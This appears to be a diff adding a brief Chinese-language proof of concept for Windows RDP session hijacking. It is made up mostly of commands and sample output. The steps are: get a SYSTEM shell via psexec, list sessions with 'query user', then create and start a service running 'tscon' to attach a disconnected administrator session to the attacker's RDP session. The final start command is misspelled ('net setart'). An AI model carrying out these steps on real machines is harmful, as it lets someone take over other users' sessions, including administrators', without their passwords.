@@ -1,0 +1,30 @@
+PoC
+
+
+实现这些只需要NT AUTHORITY/SYSTEM命令行。用psexec很容易实现，但前提是要有psexec.exe
+
+psexec -s \\localhost cmd
+另一种方法是创建一个服务，来连接目标会话。
+
+1. 获取所有会话信息：
+
+C:\Windows\system32>query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+
+ administrator                             1  Disc            1  3/12/2017 3:07 PM
+
+>localadmin            rdp-tcp#55          2  Active          .  3/12/2017 3:10 PM
+
+C:\Windows\system32>
+
+2. 创建劫持用户会话的服务
+
+C:\Windows\system32>sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
+
+[SC] CreateService SUCCESS
+
+3. 启动服务
+
+net setart sesshijack
+之后，当前会话就会替换成目标
